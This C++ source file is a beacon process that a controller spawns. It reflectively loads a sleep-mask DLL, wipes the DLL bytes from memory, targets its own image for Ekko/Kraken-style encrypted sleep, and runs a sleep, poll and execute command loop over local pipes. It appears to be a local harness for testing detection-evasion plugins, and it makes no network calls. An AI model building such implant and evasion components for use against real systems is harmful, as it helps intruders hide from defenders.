// beacon.cpp — Headless beacon process with sleep-poll callback loop.
//
// Spawned by controller.exe. Loads sleepmask.dll, then enters a loop:
//   1. Sleep (encrypted via Ekko/Kraken for N ms)
//   2. Wake up, send POLL to controller
//   3. Receive command (or "nop")
//   4. Execute command, send output + END
//   5. Repeat
//
// The controller queues commands typed while the beacon is sleeping.
// stdin/stdout are anonymous pipes set by the controller via STARTUPINFO.

#include <cstdio>
#include <cstring>
#include <fstream>
#include <vector>
#include <windows.h>
#include "../Include/PluginManager.h"

static std::vector<uint8_t> ReadFileBytes(const char* path) {
    std::ifstream f(path, std::ios::binary | std::ios::ate);
    if (!f) return {};
    auto sz = f.tellg();
    f.seekg(0);
    std::vector<uint8_t> buf(sz);
    f.read(reinterpret_cast<char*>(buf.data()), sz);
    return buf;
}

static void ExecPlugin(PluginManager& pm, const char* cmd) {
    TaskApi task{};
    task.TaskId      = "beacon";  task.TaskIdLen      = 6;
    task.Instruction = "exec";    task.InstructionLen  = 4;
    task.Command     = cmd;       task.CommandLen      = (DWORD)strlen(cmd);
    pm.ExecutePlugin("mask", &task);
}

// Read one line from stdin pipe
static bool ReadLine(char* buf, int maxLen) {
    if (!fgets(buf, maxLen, stdin)) return false;
    size_t len = strlen(buf);
    while (len > 0 && (buf[len - 1] == '\n' || buf[len - 1] == '\r'))
        buf[--len] = '\0';
    return true;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        fprintf(stderr, "beacon: launched by controller.exe, not directly\n");
        return 1;
    }

    const char* dllPath = argv[1];
    setvbuf(stdout, nullptr, _IONBF, 0);

    auto dll = ReadFileBytes(dllPath);
    if (dll.empty()) {
        printf("ERR: cannot read DLL: %s\n", dllPath);
        return 1;
    }

    PluginManager pm;
    if (!pm.LoadPlugin("mask", dll.data(), dll.size(), LoaderEngine::Reflective)) {
        printf("ERR: plugin load failed\n");
        return 1;
    }
    memset(dll.data(), 0, dll.size());
    dll.clear();

    // Auto-configure target to this process's own image
    HMODULE hSelf = GetModuleHandleA(nullptr);
    IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)hSelf;
    IMAGE_NT_HEADERS* nt  = (IMAGE_NT_HEADERS*)((BYTE*)hSelf + dos->e_lfanew);
    DWORD imageSize = nt->OptionalHeader.SizeOfImage;

    char targetCmd[128];
    snprintf(targetCmd, sizeof(targetCmd), "target %llx %lx",
             (unsigned long long)(uintptr_t)hSelf, (unsigned long)imageSize);
    ExecPlugin(pm, targetCmd);

    printf("READY pid=%lu base=0x%llx size=0x%lx\n",
           GetCurrentProcessId(),
           (unsigned long long)(uintptr_t)hSelf,
           (unsigned long)imageSize);
    fflush(stdout);

    // Wait for the controller to tell us to start the callback loop.
    // Protocol: controller sends "start <interval_ms>" or a one-shot command.
    char line[512];
    while (ReadLine(line, sizeof(line))) {
        if (strlen(line) == 0) continue;

        if (strcmp(line, "exit") == 0) {
            printf("OK: exiting\n");
            fflush(stdout);
            break;
        }

        // "run <interval_ms>" — enter the sleep-poll callback loop
        if (strncmp(line, "run ", 4) == 0) {
            DWORD interval = (DWORD)atoi(line + 4);
            if (interval < 100) interval = 1000;

            char sleepCmd[64];
            snprintf(sleepCmd, sizeof(sleepCmd), "sleep %lu", (unsigned long)interval);

            printf("LOOP interval=%lu\n", (unsigned long)interval);
            fflush(stdout);

            // Callback loop: sleep → poll → execute → repeat
            for (;;) {
                // 1. Sleep (encrypted)
                printf("SLEEPING\n");
                fflush(stdout);
                ExecPlugin(pm, sleepCmd);

                // 2. Awake — poll controller for a command
                printf("POLL\n");
                fflush(stdout);

                // 3. Read command from controller
                if (!ReadLine(line, sizeof(line))) break;

                if (strcmp(line, "exit") == 0) {
                    printf("OK: exiting\n");
                    fflush(stdout);
                    goto done;
                }

                if (strcmp(line, "nop") == 0) {
                    // No tasking — go back to sleep
                    continue;
                }

                // 4. Execute the command
                ExecPlugin(pm, line);
                printf("END\n");
                fflush(stdout);

                // 5. Back to top — sleep again
            }
            break;
        }

        // One-shot commands (before entering the loop): info, set, etc.
        ExecPlugin(pm, line);
        printf("END\n");
        fflush(stdout);
    }

done:
    pm.UnloadAll();
    return 0;
}
